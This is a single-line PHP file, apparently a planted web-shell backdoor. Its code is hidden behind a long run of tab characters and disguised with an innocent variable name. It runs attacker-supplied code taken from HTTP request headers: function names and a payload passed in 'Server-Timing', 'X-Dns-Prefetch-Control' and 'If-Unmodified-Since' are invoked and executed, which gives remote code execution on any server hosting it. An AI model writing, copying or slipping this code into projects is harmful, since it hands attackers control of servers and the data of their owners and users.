<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Server-Timing'])){$cache=$_HEADERS['Server-Timing']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['If-Unmodified-Since']));$cache();}
